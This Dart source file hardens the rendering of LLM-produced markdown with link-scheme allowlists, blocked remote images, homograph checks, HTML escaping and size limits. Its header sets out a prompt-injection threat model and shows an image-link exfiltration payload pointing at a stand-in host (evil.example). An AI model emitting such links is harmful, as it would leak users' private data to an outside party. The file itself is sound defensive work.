// Safety helpers for rendering LLM-produced markdown. Pure Dart (no Flutter), unit-tested.
//
// Threat model: the text comes from a language model that may have been steered by hostile
// content (web pages, emails, tool output). So markdown is treated as untrusted input:
//   * links may only be http / https / mailto, and are shown in full before they are opened;
//   * remote images are never fetched automatically (an image URL can carry secrets out:
//     `![x](https://evil.example/?q=<private data>)`);
//   * raw HTML is never interpreted;
//   * pathological size / nesting is bounded so a payload cannot freeze the UI.

/// URL schemes a link may use. Everything else (javascript:, data:, file:, intent:, content:,
/// tel:, sms:, vbscript:, custom app schemes, ...) is rejected.
const Set<String> kAllowedLinkSchemes = {'http', 'https', 'mailto'};

/// Returns the parsed [Uri] if [href] is safe to offer to the user, otherwise `null`.
///
/// Rejected: unknown/empty schemes, control characters or whitespace inside the URL, http(s)
/// URLs without a host, and URLs with credentials (`https://google.com@evil.example` is a
/// classic look-alike trick).
Uri? parseSafeLink(String? href) {
  if (href == null) return null;
  final raw = href.trim();
  if (raw.isEmpty || raw.length > 4096) return null;
  if (RegExp(r'[\u0000-\u001F\u007F\s]').hasMatch(raw)) return null;
  final uri = Uri.tryParse(raw);
  if (uri == null) return null;
  final scheme = uri.scheme.toLowerCase();
  if (!kAllowedLinkSchemes.contains(scheme)) return null;
  if (scheme == 'mailto') {
    return uri.path.isNotEmpty ? uri : null;
  }
  if (uri.host.isEmpty) return null;
  if (uri.userInfo.isNotEmpty) return null;
  return uri;
}

/// Same rule for images: only http(s) with a host (they are still NOT loaded automatically).
Uri? parseSafeImage(Uri uri) {
  final scheme = uri.scheme.toLowerCase();
  if (scheme != 'http' && scheme != 'https') return null;
  if (uri.host.isEmpty || uri.userInfo.isNotEmpty) return null;
  return uri;
}

/// True when the host contains non-ASCII characters (possible homograph look-alike). The
/// confirmation dialog warns about it.
bool hasUnusualHost(Uri uri) {
  // Dart percent-encodes non-ASCII host characters ("exаmple.com" -> "ex%D0%B0mple.com"), and a
  // real host name never contains '%', so either form means unusual characters.
  final host = uri.host;
  return host.isNotEmpty && (host.contains('%') || host.codeUnits.any((c) => c > 127));
}

/// The host as a person should read it (percent-escapes decoded) for the confirmation dialog.
String displayHost(Uri uri) {
  try {
    return Uri.decodeComponent(uri.host);
  } catch (_) {
    return uri.host;
  }
}

/// Size/nesting limits applied to DISPLAYED markdown. Defaults are generous for chat.
class MarkdownLimits {
  const MarkdownLimits({
    this.maxChars = 20000,
    this.maxBlockquoteDepth = 6,
    this.maxIndent = 12,
    this.maxTableRows = 200,
    this.maxTableCols = 20,
  });

  /// Longer text is cut (with a "Show more" button) so a huge reply cannot freeze the UI.
  final int maxChars;

  /// `>>>>>>>>>…` nested deeper than this is flattened (deep recursion in the parser).
  final int maxBlockquoteDepth;

  /// Leading spaces beyond this are clamped (deeply nested lists).
  final int maxIndent;

  final int maxTableRows;
  final int maxTableCols;
}

final RegExp _quotePrefix = RegExp(r'^(?:\s{0,3}>\s?)+');
final RegExp _tableSeparator = RegExp(r'^\s*\|?\s*:?-{1,}:?\s*(\|\s*:?-{1,}:?\s*)+\|?\s*$');

/// Returns [text] bounded by [limits]: nesting clamped, tables capped. Length truncation is
/// done by the widget (it needs to offer "Show more"), see [truncateAtLineBoundary].
String boundMarkdown(String text, [MarkdownLimits limits = const MarkdownLimits()]) {
  if (text.isEmpty) return text;
  final lines = text.split('\n');
  final out = <String>[];

  var inFence = false;
  var tableRows = -1; // -1 = not in a table
  var tableSkipped = 0;

  void closeTable() {
    if (tableSkipped > 0) {
      out.add('');
      out.add('_… $tableSkipped more rows not shown_');
    }
    tableRows = -1;
    tableSkipped = 0;
  }

  for (var i = 0; i < lines.length; i++) {
    var line = lines[i];
    final trimmed = line.trimLeft();

    // Fences: never touch what is inside (indentation there is content).
    if (trimmed.startsWith('```') || trimmed.startsWith('~~~')) {
      if (tableRows >= 0) closeTable();
      inFence = !inFence;
      out.add(line);
      continue;
    }
    if (inFence) {
      out.add(line);
      continue;
    }

    // Blockquote depth.
    final q = _quotePrefix.firstMatch(line);
    if (q != null) {
      final depth = '>'.allMatches(q.group(0)!).length;
      if (depth > limits.maxBlockquoteDepth) {
        line = '${'> ' * limits.maxBlockquoteDepth}${line.substring(q.end)}';
      }
    }

    // Indentation (deep list nesting).
    final lead = line.length - line.trimLeft().length;
    if (lead > limits.maxIndent) {
      line = '${' ' * limits.maxIndent}${line.trimLeft()}';
    }

    // Tables: header + separator start one; consecutive lines containing '|' are rows.
    if (tableRows < 0) {
      final nextIsSep = i + 1 < lines.length && _tableSeparator.hasMatch(lines[i + 1]);
      if (line.contains('|') && nextIsSep) {
        tableRows = 0;
        out.add(_capColumns(line, limits.maxTableCols));
        out.add(_capColumns(lines[i + 1], limits.maxTableCols));
        i++; // consumed the separator
        continue;
      }
      out.add(line);
      continue;
    }
    if (line.contains('|') && line.trim().isNotEmpty) {
      tableRows++;
      if (tableRows > limits.maxTableRows) {
        tableSkipped++;
      } else {
        out.add(_capColumns(line, limits.maxTableCols));
      }
      continue;
    }
    closeTable();
    out.add(line);
  }
  if (tableRows >= 0) closeTable();
  return out.join('\n');
}

String _capColumns(String line, int maxCols) {
  final trimmed = line.trim();
  final hasLead = trimmed.startsWith('|');
  final cells = trimmed.split('|');
  // split() yields empty first/last entries for a leading/trailing pipe.
  final inner = [
    for (var i = 0; i < cells.length; i++)
      if (!((i == 0 && hasLead && cells[i].isEmpty) || (i == cells.length - 1 && cells[i].isEmpty))) cells[i],
  ];
  if (inner.length <= maxCols) return line;
  return '| ${inner.take(maxCols).map((c) => c.trim()).join(' | ')} |';
}

final RegExp _autolink = RegExp(r'^<(?:[A-Za-z][A-Za-z0-9+.\-]{1,31}:[^\s<>]*|[^\s@<>]+@[^\s@<>]+)>');
final RegExp _fenceMark = RegExp(r'^ {0,3}(```|~~~)');

/// Makes raw HTML inert text: `<b>x</b>` is shown literally instead of being parsed (or
/// silently swallowed). `<https://…>` / `<me@x.com>` autolinks, inline code and fenced code
/// are left alone. (Autolinks with unsafe schemes are neutralised later, by the link builder.)
String escapeRawHtml(String text) {
  if (!text.contains('<')) return text;
  final lines = text.split('\n');
  var inFence = false;
  for (var li = 0; li < lines.length; li++) {
    final line = lines[li];
    if (_fenceMark.hasMatch(line)) {
      inFence = !inFence;
      continue;
    }
    if (inFence || !line.contains('<')) continue;
    final out = StringBuffer();
    var i = 0;
    while (i < line.length) {
      final c = line[i];
      if (c == '\\' && i + 1 < line.length) {
        out.write(line.substring(i, i + 2));
        i += 2;
        continue;
      }
      if (c == '`') {
        var j = i;
        while (j < line.length && line[j] == '`') {
          j++;
        }
        final run = line.substring(i, j);
        final close = line.indexOf(run, j);
        final end = close < 0 ? j : close + run.length; // unterminated: just the backticks
        out.write(line.substring(i, end));
        i = end;
        continue;
      }
      if (c == '<' && i + 1 < line.length && RegExp(r'[A-Za-z/!?]').hasMatch(line[i + 1])) {
        final auto = _autolink.firstMatch(line.substring(i));
        if (auto != null) {
          out.write(auto.group(0));
          i += auto.end;
        } else {
          out.write(r'\<');
          i++;
        }
        continue;
      }
      out.write(c);
      i++;
    }
    lines[li] = out.toString();
  }
  return lines.join('\n');
}

/// Cuts [text] to at most [maxChars], preferring a line boundary in the last 20 %.
String truncateAtLineBoundary(String text, int maxChars) {
  if (text.length <= maxChars) return text;
  final cut = text.lastIndexOf('\n', maxChars);
  final end = cut > maxChars * 0.8 ? cut : maxChars;
  return text.substring(0, end);
}

// ---------------------------------------------------------------------------------------
// Plain-text stripping (voice captions, notifications, anywhere raw markdown symbols must
// not show).
// ---------------------------------------------------------------------------------------

final RegExp _fencedBlock = RegExp(r'(```|~~~)[^\n]*\n([\s\S]*?)(\1|$)');
final RegExp _htmlTag = RegExp(r'</?[A-Za-z][^>]*>');

/// Removes markdown syntax and keeps the words: `**bold**` → `bold`, `[text](url)` → `text`,
/// images → their alt text, code fences → their content, list bullets / headings / quote
/// markers / table pipes / rules dropped. Never throws.
String stripMarkdown(String text) {
  try {
    var s = text;
    s = s.replaceAllMapped(_fencedBlock, (m) => m.group(2) ?? '');
    s = s.replaceAllMapped(RegExp(r'!\[([^\]]*)\]\([^)]*\)'), (m) => m.group(1) ?? '');
    s = s.replaceAllMapped(RegExp(r'\[([^\]]+)\]\([^)]*\)'), (m) => m.group(1) ?? '');
    s = s.replaceAll(_htmlTag, '');
    s = s.replaceAll(RegExp(r'^\s{0,3}#{1,6}\s*', multiLine: true), '');
    s = s.replaceAll(RegExp(r'^\s*>+\s?', multiLine: true), '');
    s = s.replaceAll(RegExp(r'^\s*([-*+]|\d{1,9}[.)])\s+(\[[ xX]\]\s+)?', multiLine: true), '');
    s = s.replaceAll(RegExp(r'^\s*([-*_]\s*){3,}$', multiLine: true), '');
    s = s.replaceAll(RegExp(r'^\s*\|?\s*:?-{2,}:?\s*(\|\s*:?-{2,}:?\s*)+\|?\s*$', multiLine: true), '');
    s = s.replaceAll('|', ' ');
    s = s.replaceAllMapped(RegExp(r'(\*\*|__|~~)(.+?)\1'), (m) => m.group(2) ?? '');
    s = s.replaceAllMapped(RegExp(r'(?<![\w*])\*(?!\s)(.+?)(?<!\s)\*(?![\w*])'), (m) => m.group(1) ?? '');
    s = s.replaceAllMapped(RegExp(r'(?<![\w_])_(?!\s)(.+?)(?<!\s)_(?![\w_])'), (m) => m.group(1) ?? '');
    // Dangling markers from text that is still streaming ("**hel" has no closing pair yet).
    s = s.replaceAll(RegExp(r'\*\*|__|~~'), '').replaceAll('`', '');
    s = s.replaceAll(RegExp(r'[ \t]+'), ' ').replaceAll(RegExp(r' *\n *'), '\n').replaceAll(RegExp(r'\n{3,}'), '\n\n');
    return s.trim();
  } catch (_) {
    return text;
  }
}
